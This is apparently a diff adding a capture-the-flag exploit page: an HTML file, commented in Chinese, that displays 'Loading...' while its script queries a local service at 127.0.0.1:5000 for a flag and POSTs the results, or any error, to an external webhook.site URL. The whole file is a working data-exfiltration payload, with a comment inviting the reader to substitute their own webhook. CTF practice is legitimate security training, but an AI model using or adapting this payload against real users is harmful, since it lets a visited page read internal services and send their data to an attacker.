@@ -1,0 +1,50 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>CTF Exploit</title>
+</head>
+<body>
+    <h1>Loading...</h1>
+    <script>
+        // 你的 webhook.site URL (記得替換成你的)
+        const webhookUrl = 'https://webhook.site/23ec46e9-3d01-4059-9ddd-8b65ad743c9a';
+        
+        // 發送請求到本地的 /search 端點搜尋 flag
+        fetch('http://127.0.0.1:5000/search?q=flag')
+            .then(response => response.json())
+            .then(data => {
+                console.log('Search results:', data);
+                
+                // 將結果發送到 webhook.site
+                return fetch(webhookUrl, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        message: 'Flag found!',
+                        results: data
+                    })
+                });
+            })
+            .then(() => {
+                console.log('Data sent to webhook');
+            })
+            .catch(error => {
+                console.error('Error:', error);
+                
+                // 如果出錯也發送錯誤信息到 webhook
+                fetch(webhookUrl, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        message: 'Error occurred',
+                        error: error.toString()
+                    })
+                });
+            });
+    </script>
+</body>
+</html>
